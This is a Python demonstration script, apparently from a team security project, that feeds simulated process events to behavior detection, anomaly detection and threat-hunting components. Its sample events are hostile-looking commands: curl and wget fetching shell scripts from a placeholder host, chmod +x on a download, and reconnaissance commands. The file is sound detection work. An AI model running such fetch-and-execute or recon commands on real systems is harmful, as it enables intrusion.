
"""Member 2 demonstration: detection, anomaly analysis, and threat hunting."""

import json
import sys
from pathlib import Path

# Allow running this script directly from the project root or scripts folder.
PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from detection.anomaly_detection.anomaly_detector import AnomalyDetector
from detection.anomaly_detection.behavior_detector import BehaviorDetector
from detection.anomaly_detection.mitre_enrichment import (
    enrich_anomaly_finding,
)
from detection.event_schema import ProcessInfo, SecurityEvent
from detection.threat_hunting.hunt_engine import ThreatHunter


def make_event(host, command_line, process_name="bash"):
    """Create a simulated process execution security event."""
    return SecurityEvent(
        event_type="process_execution",
        source="demo",
        host=host,
        process=ProcessInfo(
            name=process_name,
            command_line=command_line,
        ),
    )


def main():
    print("=" * 65)
    print(" MEMBER 2 — DETECTION & THREAT HUNTING DEMONSTRATION")
    print("=" * 65)

    events = [
        make_event("server-01", "bash -c 'curl https://example.invalid/a.sh'"),
        make_event("server-01", "bash -c 'chmod +x a.sh'"),
        make_event("server-01", "bash -c 'base64 payload.txt'"),
        make_event("server-01", "bash -c 'wget https://example.invalid/b.sh'"),
        make_event("server-01", "bash -c 'whoami'"),
        make_event("server-01", "bash -c 'id'"),
        make_event("server-01", "bash -c 'uname -a'"),
        make_event("server-01", "bash -c 'ps aux'"),
        make_event("server-02", "ls -la"),
        make_event("server-02", "whoami"),
    ]

    print("\n[1] SIMULATED SECURITY EVENTS")
    print(f"Total events created: {len(events)}")
    print(f"Unique hosts: {len({event.host for event in events})}")

    print("\n[2] BEHAVIOR-BASED DETECTION")
    behavior_findings = BehaviorDetector().analyze(events)

    if behavior_findings:
        for finding in behavior_findings:
            print(json.dumps(finding, indent=2, default=str))
    else:
        print("No suspicious command patterns found.")

    print("\n[3] STATISTICAL ANOMALY DETECTION")
    anomaly_detector = AnomalyDetector(
        minimum_events=5,
        threshold_multiplier=1.5,
    )
    anomaly_findings = anomaly_detector.detect_event_bursts(events)

    enriched_findings = [
        enrich_anomaly_finding(finding)
        for finding in anomaly_findings
    ]

    if enriched_findings:
        for finding in enriched_findings:
            print(json.dumps(finding, indent=2, default=str))
    else:
        print("No event-volume anomalies found.")

    print("\n[4] THREAT HUNTING")
    hunter = ThreatHunter()
    hunter.add_events(events)

    hunt_results = hunter.hunt(
        event_type="process_execution",
        host="server-01",
        keyword="curl",
    )

    print(f"Events matching process_execution on server-01 with 'curl': {len(hunt_results)}")

    if hunt_results:
        print(hunter.summarize(hunt_results))

    print("\n[5] SUMMARY")
    print(f"Simulated events: {len(events)}")
    print(f"Behavior findings: {len(behavior_findings)}")
    print(f"Anomaly findings: {len(anomaly_findings)}")
    print(f"Threat-hunting matches: {len(hunt_results)}")
    print("\nDemo completed. All events in this demonstration are simulated.")
    print("MITRE mappings and findings require validation against real telemetry.")


if __name__ == "__main__":
    main()